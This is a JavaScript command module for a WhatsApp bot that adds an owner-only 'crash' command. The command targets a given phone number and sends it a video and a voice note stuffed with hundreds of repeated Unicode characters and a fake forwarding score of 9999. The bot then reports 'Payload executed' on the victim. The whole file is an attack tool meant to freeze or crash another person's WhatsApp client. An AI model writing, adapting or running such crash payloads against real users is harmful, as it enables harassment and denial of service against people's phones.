const ownerMiddleware = require('../../utility/botUtil/Ownermiddleware');

module.exports = {
  name: 'crash',
  aliases: ['avx'],
  description: 'Executes AudioVisualXDellay function (owner only)',
  run: async (context) => {
    await ownerMiddleware(context, async () => {
      const { client, m, prefix, text, botname } = context;

      try {
        // Check for target (phone number, quoted user, or current chat if DM)
        let target = text.split(' ')[0] || m.quoted?.sender;
        
        // If no target specified and it's a DM, use current chat
        if (!target && !m.isGroup) {
          target = m.chat;
        }

        if (!target) {
          return client.sendMessage(m.chat, {
            text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Usage: ${prefix}crash <number> or reply to a message\n│❒ Example: ${prefix}crash 254735342800\n┗━━━━━━━━━━━━━━━┛`
          }, { quoted: m });
        }

        // Convert to JID format if needed
        if (!target.includes('@s.whatsapp.net')) {
          target = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
        }

        // Execute the function
        await AudioVisualXDellay(client, target);

        // Success response
        await client.sendMessage(m.chat, {
          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ 💥 Payload executed on ${target}\n┗━━━━━━━━━━━━━━━┛`
        }, { quoted: m });

      } catch (error) {
        console.error('AudioVisualXDellay error:', error);
        await client.sendMessage(m.chat, {
          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Failed to execute payload\n│❒ Error: ${error.message}\n┗━━━━━━━━━━━━━━━┛`
        }, { quoted: m });
      }
    });
  },
};

async function AudioVisualXDellay(sock, target) {
  // First send the video message
  const videoMsg = {
    video: {
      url: 'https://example.com/dummy.mp4', // Placeholder URL
      caption: "꧔꧈".repeat(600),
      mimetype: "video/mp4",
      fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺",
      viewOnce: true
    },
    contextInfo: {
      forwardingScore: 9999,
      isForwarded: true
    }
  };

  // Then send the audio message
  const audioMsg = {
    audio: {
      url: 'https://example.com/dummy.ogg', // Placeholder URL
      mimetype: "audio/ogg; codecs=opus",
      ptt: true,
      fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺" + "꧔꧈".repeat(500)
    },
    contextInfo: {
      forwardingScore: 9999,
      isForwarded: true,
      mentionedJid: [
        ...Array.from({ length: 1 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ]
    }
  };

  // Send messages separately with proper media handling
  await sock.sendMessage(target, videoMsg);
  await sock.sendMessage(target, audioMsg);
}